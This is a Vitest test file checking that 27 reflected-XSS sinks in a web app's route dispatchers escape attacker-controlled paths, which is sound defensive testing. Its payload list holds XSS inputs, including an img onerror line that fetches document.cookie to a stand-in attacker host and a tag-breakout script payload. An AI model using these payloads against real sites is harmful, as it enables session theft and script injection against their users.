/**
 * Bølge 2B integration test: verify the 27 reflected-XSS sinks (FIN-P1-01)
 * actually escape attacker-controlled `path` values.
 *
 * Strategy: import a representative subset of the 27 dispatchers, mount each
 * with an `<svg/onload=...>`-style payload as `path`, then assert the
 * resulting DOM does NOT contain a real `<svg>` element. If it does, the
 * payload would have executed in a real browser.
 *
 * We test 3 dispatchers from different category-groups to give signal that
 * the centralised `renderUnknownRoute` helper is actually wired up
 * everywhere — but the unit tests on `renderUnknownRoute` itself are the
 * exhaustive guarantee.
 */

import { describe, expect, it, beforeEach } from "vitest";
import { mountSecurityRoute } from "../src/pages/security/index.js";
import { mountPlayerRoute } from "../src/pages/players/index.js";
import { mountAdminOpsRoute } from "../src/pages/admin-ops/index.js";

const XSS_PAYLOADS = [
  `<svg/onload=alert(1)>`,
  `<script>alert(1)</script>`,
  `<img src=x onerror=fetch('//attacker?'+document.cookie)>`,
  `"><script>alert(1)</script>`,
  `'\\\";alert(1)//'`,
];

function makeContainer(): HTMLElement {
  const c = document.createElement("div");
  c.id = "test-container";
  document.body.append(c);
  return c;
}

describe("FIN-P1-01: 27 reflected XSS sinks are now escaped", () => {
  beforeEach(() => {
    document.body.innerHTML = "";
  });

  describe("security dispatcher — /unknown route", () => {
    for (const payload of XSS_PAYLOADS) {
      it(`escapes payload: ${payload.slice(0, 40)}`, () => {
        const container = makeContainer();
        mountSecurityRoute(container, payload);

        // Sanity: error box is rendered.
        const errBox = container.querySelector(".box.box-danger");
        expect(errBox).not.toBeNull();

        // Critical assertion: NO real <svg> / <script> / <img> element from the
        // attacker payload survives in the DOM.
        expect(container.querySelectorAll("svg")).toHaveLength(0);
        expect(container.querySelectorAll("script")).toHaveLength(0);
        // <img> from the attacker payload — there's no legitimate <img> in
        // the unknown-route box, so any <img> would be from the payload.
        expect(container.querySelectorAll("img")).toHaveLength(0);

        // Payload text appears as literal text content.
        expect(container.textContent).toContain(payload);
      });
    }
  });

  describe("players dispatcher — /unknown route", () => {
    for (const payload of XSS_PAYLOADS) {
      it(`escapes payload: ${payload.slice(0, 40)}`, () => {
        const container = makeContainer();
        mountPlayerRoute(container, payload);
        expect(container.querySelectorAll("svg")).toHaveLength(0);
        expect(container.querySelectorAll("script")).toHaveLength(0);
        expect(container.querySelectorAll("img")).toHaveLength(0);
        expect(container.textContent).toContain(payload);
      });
    }
  });

  describe("admin-ops dispatcher — /unknown route", () => {
    for (const payload of XSS_PAYLOADS) {
      it(`escapes payload: ${payload.slice(0, 40)}`, () => {
        const container = makeContainer();
        mountAdminOpsRoute(container, payload);
        expect(container.querySelectorAll("svg")).toHaveLength(0);
        expect(container.querySelectorAll("script")).toHaveLength(0);
        expect(container.querySelectorAll("img")).toHaveLength(0);
        expect(container.textContent).toContain(payload);
      });
    }
  });

  describe("attacker payload no longer reaches dangerous DOM context", () => {
    it("payload chars do not break out of <code> wrapper", () => {
      const container = makeContainer();
      // Use the helper that powers all 27 dispatchers — same code path as
      // mountSecurityRoute/mountPlayerRoute/mountAdminOpsRoute.
      mountSecurityRoute(container, `</div></div><script>alert(1)</script>`);
      // The closing </div></div> from the payload must be escaped — otherwise
      // the wrapper closes early and the script would be a sibling of the
      // box (and thus parsed as real script).
      expect(container.querySelectorAll("script")).toHaveLength(0);
      const errBox = container.querySelector(".box.box-danger");
      expect(errBox).not.toBeNull();
      // The error-box should still wrap the entire (escaped) payload.
      expect(errBox?.textContent).toContain("<script>alert(1)</script>");
    });
  });
});
